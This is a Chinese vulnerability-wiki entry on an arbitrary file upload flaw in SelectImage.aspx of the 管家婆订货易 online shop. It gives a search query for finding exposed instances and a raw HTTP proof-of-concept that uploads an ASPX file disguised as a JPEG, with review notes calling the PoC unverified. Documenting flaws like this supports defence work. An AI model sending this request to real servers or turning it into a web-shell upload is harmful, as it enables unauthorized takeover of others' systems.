---
source: "Threekiii/Vulnerability-Wiki"
title: "任我行管家婆订货易 SelectImage.aspx文件上传"
product: "任我行管家婆订货易"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，ASPX执行及可访问上传目录"
prerequisites: "未说明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%AE%A1%E5%AE%B6%E5%A9%86/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-SelectImage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-f83d009caeee2b307200d197"
entity_id: "ve-5d384ff4deeebccbc5a43637"
schema_version: "1"
canonical: "Web安全/商业软件/任我行/任我行 管家婆 订货易在线商城 SelectImage.aspx 任意文件上传漏洞.md"
relation_type: "duplicate_of"
---

# 任我行管家婆订货易 SelectImage.aspx文件上传

## 条目说明

- 对象与具体问题：任我行管家婆订货易；SelectImage.aspx文件上传
- 版本、配置及部署条件：版本未知，ASPX执行及可访问上传目录
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- multipart闭合边界尾多一个引号，User-Agent含无关Base64噪声
- 上传成功回显/URL只在未视检图片，不能仅据请求断言系统控制
- 与494不同接口应分实体，同ERP产品可统一分类
- 缺修复/版本及上传清理说明

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 漏洞描述

任我行率先针对中小企业推出了管家婆进销存、财务一体化软件。

管家婆订货易在线商城存在 SelectImage.aspx 任意文件上传漏洞，攻击者可通过该漏洞可控制整个系统，最终导致系统处于极度不安全状态。

### 漏洞影响

管家婆 订货易在线商城

### 网络测绘

```
title="订货易"
```

### 漏洞复现

登陆页面

![image-20231115102159123](./.resource/任我行-管家婆-订货易在线商城-SelectImage.aspx-任意文件上传漏洞/media/image-20231115102159123.png)

poc

```http
POST /DialogTemplates/SelectImage.aspx?type=titleimg&size=30*100&pageindex=1&iscallback=true HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b

--532c7611457d40f4ae4cd9422973416b
Content-Disposition: form-data; name="Filedata"; filename="TEST.aspx"
Content-Type: image/jpeg

<% Response.Write("Test"); %>
--532c7611457d40f4ae4cd9422973416b--"
```

![image-20231115102227428](./.resource/任我行-管家婆-订货易在线商城-SelectImage.aspx-任意文件上传漏洞/media/image-20231115102227428-17000150119182.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
